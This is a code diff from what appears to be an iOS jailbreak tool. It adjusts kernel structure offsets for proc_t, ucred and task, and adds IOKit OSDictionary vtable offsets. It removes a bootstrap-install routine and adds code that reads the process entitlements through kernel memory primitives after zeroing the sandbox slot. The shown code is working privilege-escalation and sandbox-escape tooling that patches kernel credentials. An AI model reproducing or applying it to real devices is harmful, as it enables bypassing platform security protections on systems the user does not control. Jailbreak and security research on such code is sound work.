@@ -162,7 +162,7 @@ static unsigned off_p_gid = 0x34;               // proc_t::p_uid
 static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
 static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
 static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
-static unsigned off_p_csflags = 0x280;          // proc_t::p_csflags
+static unsigned off_p_csflags = 0x290;          // proc_t::p_csflags
 
 static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
 static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
@@ -174,7 +174,7 @@ static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
 static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label
 
 static unsigned off_sandbox_slot = 0x10;
-static unsigned off_t_flags = 0x3a0; // task::t_flags
+static unsigned off_t_flags = 0x3A0; // task::t_flags
 
 
 
@@ -217,7 +217,21 @@ write_32(target_task + 0xA8, (void*)old_t_flags);
 int system_(char *cmd) {
     return launch("/var/bin/bash", "-c", cmd, NULL, NULL, NULL, NULL, NULL);
 }
+static uint32_t off_OSDictionary_SetObjectWithCharP = sizeof(void*) * 0x1F;
+static uint32_t off_OSDictionary_GetObjectWithCharP = sizeof(void*) * 0x26;
+static uint32_t off_OSDictionary_Merge              = sizeof(void*) * 0x23;
 
+static uint32_t off_OSArray_Merge                   = sizeof(void*) * 0x1E;
+static uint32_t off_OSArray_RemoveObject            = sizeof(void*) * 0x20;
+static uint32_t off_OSArray_GetObject               = sizeof(void*) * 0x22;
+
+static uint32_t off_OSObject_Release                = sizeof(void*) * 0x05;
+static uint32_t off_OSObject_GetRetainCount         = sizeof(void*) * 0x03;
+static uint32_t off_OSObject_Retain                 = sizeof(void*) * 0x04;
+
+static uint32_t off_OSString_GetLength              = sizeof(void*) * 0x11;
+
+ 
 -(void) installBootstrapAndUnsadbox:(NSString *)data
 {
 
@@ -252,7 +266,7 @@ write_20(cr_label + 0x10, (void*)buffer);
 
 [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/c0met.ini" contents:nil attributes:nil];
 if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
-    LOG("prison break :)\n");
+    LOG("sandbox_slot killed -> granted r/w\n");
     NSFileManager *fm = [NSFileManager defaultManager];
     NSArray* files = [fm directoryContentsAtPath:@"/"];
     NSMutableArray *directoryList = [NSMutableArray arrayWithCapacity:10];
@@ -266,70 +280,25 @@ if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
         }
     }
     NSError*error;
-    LOG("%s",directoryList);
-    if (!fileExists("/var/mobile/c0met.ini")) {
-            
-            if (fileExists("/var/containers/Bundle/iosbinpack64")) {
-                
-                LOG("[*] Uninstalling previous build...");
-                
-                removeFile("/var/LIB");
-                removeFile("/var/ulb");
-                removeFile("/var/bin");
-                removeFile("/var/sbin");
-                removeFile("/var/containers/Bundle/tweaksupport/Applications");
-                removeFile("/var/Apps");
-                removeFile("/var/profile");
-                removeFile("/var/motd");
-                removeFile("/var/dropbear");
-                removeFile("/var/containers/Bundle/tweaksupport");
-                removeFile("/var/containers/Bundle/iosbinpack64");
-                removeFile("/var/containers/Bundle/dylibs");
-                removeFile("/var/log/testbin.log");
-                
-                if (fileExists("/var/log/jailbreakd-stdout.log")) removeFile("/var/log/jailbreakd-stdout.log");
-                if (fileExists("/var/log/jailbreakd-stderr.log")) removeFile("/var/log/jailbreakd-stderr.log");
-            }
-            
-            LOG("[*] Installing bootstrap...");
-            
-            chdir("/var/containers/Bundle/");
-           
-            
-            
-            LOG("[+] Creating symlinks...");
-            
-            symlink("/var/containers/Bundle/tweaksupport/Library", "/var/LIB");
-            symlink("/var/containers/Bundle/tweaksupport/usr/lib", "/var/ulb");
-            symlink("/var/containers/Bundle/tweaksupport/Applications", "/var/Apps");
-            symlink("/var/containers/Bundle/tweaksupport/bin", "/var/bin");
-            symlink("/var/containers/Bundle/tweaksupport/sbin", "/var/sbin");
-            symlink("/var/containers/Bundle/tweaksupport/usr/libexec", "/var/libexec");
-            
-            close(open("/var/containers/Bundle/.installed_rootlessJB3", O_CREAT));
-            
-            //limneos
-            symlink("/var/containers/Bundle/iosbinpack64/etc", "/var/etc");
-            symlink("/var/containers/Bundle/tweaksupport/usr", "/var/usr");
-            symlink("/var/containers/Bundle/iosbinpack64/usr/bin/killall", "/var/bin/killall");
-            
-            LOG("[+] Installed bootstrap!");
-        chmod(in_bundle("tester"), 0777); // give it proper permissions
-        if (launch(in_bundle("tester"), NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
-               
-               
-               // test
-               int ret = launch("/var/containers/Bundle/iosbinpack64/test", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-     
-            
-               LOG("[+] Successfully trusted binaries!");
-           }
-        }
-        
-//launch("/var/mobile/uicache", 0, 0, 0, 0, 0, 0, 0);
+    
+    uint64_t proc = ucred;
 
-
-
+  
+    uint64_t entitlements_pac = cr_label | 0x8;
+    
+    uint64_t real_ent=read_64(entitlements_pac);
+    
+    printf("entitlements: 0x%llx",real_ent);
+    LOG("entitlements: 0x%llx",real_ent);
+    //size_t len = strlen("get-task-allow") + 1;
+    //uint64_t kern_size =vm_allocate(ucred, real_ent, len, VM_FLAGS_ANYWHERE);
+    //write(real_ent, "get-task-allow", kern_size);
+    //uint64_t vtab=read_64(real_ent);
+    //uint64_t f=read_64(vtab + off_OSDictionary_GetObjectWithCharP);
+    //printf("tfp allow dictionary: 0x%llx",f);
+    //LOG("tfp allow dictionary: 0x%llx",f);
+   
+    sleep(2);
 
 } else {
     printf("Could not escape the sandbox\n");
@@ -345,7 +314,7 @@ sleep(1);
 
     if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
         LOG("...");
-        LOG("yes yes we are in. jailbroken state unless you exit the app");
+        LOG("Sandbox looks ok from here sprayed some permissions.");
     }
     //this will bypass sandbox
     [self installBin:@"babe we are burning dat today"];
